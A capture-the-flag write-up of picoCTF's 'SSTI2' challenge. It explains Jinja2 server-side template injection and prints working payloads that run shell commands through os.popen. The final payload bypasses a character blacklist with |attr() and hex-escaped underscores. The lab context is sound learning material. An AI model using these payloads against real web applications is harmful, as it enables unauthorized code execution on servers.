---
layout: terminal_centered
title: SSTI2
permalink: /writeups/picoctf/web/medium/ssti2
date: 2026-04-06
category: writeups
---

# Challenge Description
**Author:** Venax  
**Description:**  
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)  
Additional details will be available after launching your challenge instance.  

Hint 1: Server Side Template Injection  
Hint 2: Why is blacklisting characters a bad idea to sanitize input?  

### Thought Process + Solve  
I hate web because I don't get anything that is happening and like no math is involved, but its homework so I gotta do it.  

#### What is SSTI?  
SSTI stands for server-side templated injection, from what I know its a web vulnerability where the adversary inputs malicious code for the template engine like Jinja2 to process.  

#### Solve  
There is a SSTI1, in which we used this payload:  
{% raw %} `{{ request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}` {% endraw %}  

So I tried using this payload again, but I mean obviously it did not work and it returned this.  
![Here lies a picture](/assets/img/picoCTF/ssti2/stop_trying_to_break_me.png)  

In one of the hints, it said that they used blacklisting characters to sanitize inputs, so I decided to play around and see which characters are not allowed.  
I tried a few other payloads like {% raw %} `{{7 * 7}}` {% endraw %} which did not output anything interesting that indicated blacklisting, but here are some of the payloads that gave me information about the blacklisted characters.  

{% raw %} `{{ config.items }}` {% endraw %}  -> Confirmed that the fullstop was blacklisted  
So I went online and found a way to use the fullstop without having to type it out by using |attr() as an alternative.  
{% raw %} `{{ cycler|attr('__init__') }}` {% endraw %}  -> Confirmed that the underscore was blacklisted  
I decided the encode the underscore in hex before sending it out, that way the underscore would not be blacklisted but still parsed as an underscore when ran as code.  

Final Payload: {% raw %} `{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}` {% endraw %}  
I simply replaced the fullstops and the underscores in the final payload for SSTI1 and it worked as it bypassed the filter and gave me the flag  

#### Flag
![Here lies a picture](/assets/img/picoCTF/ssti2/ssti2_flag.png)  

#### Summary
Blacklisted Symbols: ".", "_"  
Functions/Methods used to bypass the filter: |attr(), `__getitem__`, \x5f  
Replace the previous SSTI1 payload's fullstops with |attr("\x5f\x5fgetitem\x5f\x5f") and replace all underscores in the function with \x5f  